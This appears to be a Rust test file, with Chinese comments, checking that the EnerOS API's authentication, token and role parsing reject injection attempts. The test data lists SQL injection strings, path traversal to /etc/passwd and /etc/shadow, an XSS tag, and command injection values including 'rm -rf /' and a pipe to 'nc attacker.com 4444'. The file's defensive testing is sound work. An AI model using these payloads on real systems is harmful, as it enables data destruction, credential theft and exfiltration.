//! A03:2021 — 注入 (Injection)
//!
//! 测试 EnerOS 对注入攻击的防护，验证：
//! - SQL 注入防护（EnerOS 不使用 SQL，验证无 SQL 拼接）
//! - 路径遍历防护
//! - 命令注入防护

#[cfg(test)]
use eneros_api::auth::{AuthManager, Role};

/// 验证用户名注入 SQL 片段不会破坏认证逻辑
#[test]
fn test_sql_injection_in_username_rejected() {
    let manager = AuthManager::new("test-secret", 3600);
    manager.add_user("alice", "password123", Role::Operator);

    // SQL 注入尝试
    let sql_injection_attempts = [
        "alice' OR '1'='1",
        "alice'; DROP TABLE users; --",
        "alice' UNION SELECT * FROM users; --",
        "' OR 1=1 --",
        "admin'--",
    ];

    for attempt in &sql_injection_attempts {
        let result = manager.validate_credentials(attempt, "anything");
        assert!(
            result.is_err(),
            "SQL 注入尝试应被拒绝: {}",
            attempt
        );
    }
}

/// 验证密码字段注入 SQL 不会绕过认证
#[test]
fn test_sql_injection_in_password_rejected() {
    let manager = AuthManager::new("test-secret", 3600);
    manager.add_user("alice", "password123", Role::Operator);

    let sql_injection_passwords = [
        "' OR '1'='1",
        "password' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT password FROM users; --",
    ];

    for attempt in &sql_injection_passwords {
        let result = manager.validate_credentials("alice", attempt);
        assert!(
            result.is_err(),
            "密码字段 SQL 注入应被拒绝: {}",
            attempt
        );
    }
}

/// 验证 API Key 注入尝试被拒绝
#[test]
fn test_injection_in_api_key_rejected() {
    let manager = AuthManager::new("test-secret", 3600);
    manager.add_api_key("valid-key", "service", Role::Observer);

    let injection_attempts = [
        "valid-key' OR '1'='1",
        "valid-key; DROP TABLE api_keys; --",
        "' OR 1=1; --",
        "valid-key UNION SELECT * FROM api_keys",
    ];

    for attempt in &injection_attempts {
        let result = manager.authenticate_api_key(attempt);
        assert!(
            result.is_err(),
            "API Key 注入应被拒绝: {}",
            attempt
        );
    }
}

/// 验证路径遍历字符串在用户名中被安全处理
#[test]
fn test_path_traversal_in_username_rejected() {
    let manager = AuthManager::new("test-secret", 3600);
    manager.add_user("alice", "password123", Role::Operator);

    let path_traversal_attempts = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32",
        "alice/../../../etc/shadow",
        "%2e%2e%2f%2e%2e%2f",
    ];

    for attempt in &path_traversal_attempts {
        let result = manager.validate_credentials(attempt, "password123");
        assert!(
            result.is_err(),
            "路径遍历尝试应被拒绝: {}",
            attempt
        );
    }
}

/// 验证命令注入字符串在用户名中被安全处理
#[test]
fn test_command_injection_in_username_rejected() {
    let manager = AuthManager::new("test-secret", 3600);
    manager.add_user("alice", "password123", Role::Operator);

    let command_injection_attempts = [
        "alice; rm -rf /",
        "alice && cat /etc/passwd",
        "alice | nc attacker.com 4444",
        "alice`whoami`",
        "alice$(id)",
        "alice; shutdown -h now",
    ];

    for attempt in &command_injection_attempts {
        let result = manager.validate_credentials(attempt, "password123");
        assert!(
            result.is_err(),
            "命令注入尝试应被拒绝: {}",
            attempt
        );
    }
}

/// 验证 JWT token 中注入特殊字符不会绕过验证
#[test]
fn test_injection_in_jwt_token_rejected() {
    let manager = AuthManager::new("test-secret", 3600);

    let injection_tokens = [
        "../../../etc/passwd",
        "'; DROP TABLE tokens; --",
        "token' OR '1'='1",
        "<script>alert('xss')</script>",
    ];

    for token in &injection_tokens {
        let result = manager.verify_token(token);
        assert!(
            result.is_err(),
            "注入 token 应被拒绝: {}",
            token
        );
    }
}

/// 验证 Role 字符串解析对注入尝试安全
#[test]
fn test_role_parse_injection_safe() {
    let injection_roles = [
        "admin' OR '1'='1",
        "supervisor; DROP TABLE roles",
        "../../../etc/passwd",
        "operator`whoami`",
    ];

    for role in &injection_roles {
        let result = Role::parse(role);
        assert!(
            result.is_none(),
            "注入 Role 字符串应返回 None: {}",
            role
        );
    }
}
